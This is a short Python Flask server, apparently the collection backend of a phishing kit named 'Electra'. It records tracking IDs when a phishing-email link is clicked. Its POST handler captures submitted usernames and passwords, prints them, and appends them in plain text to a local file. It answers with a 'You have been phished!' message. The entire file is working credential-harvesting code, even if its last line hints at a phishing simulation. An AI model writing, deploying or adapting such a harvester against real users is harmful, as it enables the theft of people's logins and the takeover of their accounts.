from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/track", methods=["GET", "POST"])
def track():
    if request.method == "GET":
        tracking_id = request.args.get("id", "unknown")
        print(f"[!] Phishing Email Link Click Tracked: {tracking_id}")
        with open("Electra-Phished-Creds.txt", "a") as file:
            file.write(f"Unique ID: {tracking_id}\n")
        print("[!] Phished ID successfully saved to CWD.")
    elif request.method == "POST":
        username = request.form.get("username", "unknown")
        password = request.form.get("password", "unknown")
        print(f"[!] Phished Credentials\nUsername: {username} - Password: {password}")
        with open("Electra-Phished-Creds.txt", "a") as file:
            file.write(f"Username: {username} - Password: {password}\n")
        print("[!] Phished credentials successfully saved to CWD.")
    return jsonify({"status": "success"},
                   {"MOTD": "You have been phished!"})

if __name__ == "__main__":
    app.run(debug=True)